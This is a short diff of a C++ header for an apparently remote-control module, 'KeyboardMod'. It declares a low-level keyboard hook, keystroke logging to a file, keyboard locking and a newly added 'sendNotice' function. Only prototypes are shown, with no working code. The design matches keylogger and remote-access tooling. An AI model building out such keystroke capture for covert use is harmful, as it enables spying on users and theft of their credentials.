@@ -15,18 +15,19 @@
 #include "utils.h"
 
 LRESULT __stdcall hookCallback(int, WPARAM, LPARAM);
-bool setHook();
-bool releaseHook();
-void setLogFile();
 void logKeystroke(int);
 void lockKeyboard();
-void releaseKeyboard();
+bool releaseHook();
+bool setHook();
+void setLogFile();
+void sendNotice();
 
 extern std::map<int, std::wstring> mapSpecialKeys;
 extern HHOOK ghHook;
 extern KBDLLHOOKSTRUCT kbdStruct;
 extern std::wofstream logFile;
 extern std::mutex logFileMutex;
+extern bool noticeSentForSession;
 extern std::pair<bool, bool> caseStatus;
 class KeyboardMod : public RCDOMod {
 public:
